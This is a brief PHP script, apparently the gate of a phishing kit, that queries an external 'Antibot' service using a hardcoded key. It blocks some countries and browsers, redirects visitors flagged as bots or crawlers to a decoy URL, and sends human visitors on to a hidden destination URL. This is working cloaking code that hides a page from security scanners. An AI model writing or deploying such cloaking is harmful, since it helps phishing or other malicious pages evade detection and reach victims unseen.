<?php
require_once('autoload.php'); 
$keyantibot = 'J7jBCEq';
if(isset($keyantibot) && $_SESSION['check'] == false){

	  $respons = $Antibot->redirect( $config['apikey'] ,$keyantibot);
    $json    = $Antibot->json($respons);

    if($json['block_access']){
        if( preg_match("/404|403/", $json['block_access']) ){
            $Antibot->error(403 , 'You cannot access because your country or browser does not support.');
        }
    }

    if($json['status'] == false){
    	$Antibot->error(100 , $json['message']);
    }
    
    $_SESSION['check'] = true;

    if($json['is_bot'] == true){
	
  		$_SESSION['is_bot'] 	= true;
  		$_SESSION['direct_url']	= $json['direct_url'];
  		die(header("Location: ".$config['redirect_bot']));

    }
    
    $_SESSION['is_bot'] 	   = false;
    $_SESSION['direct_url']	  = $json['direct_url'];

    die(header("Location: ".$json['direct_url']));
}

if($_SESSION['check'] == true){
    die(header("Location: ".$_SESSION['direct_url']));
}
?>
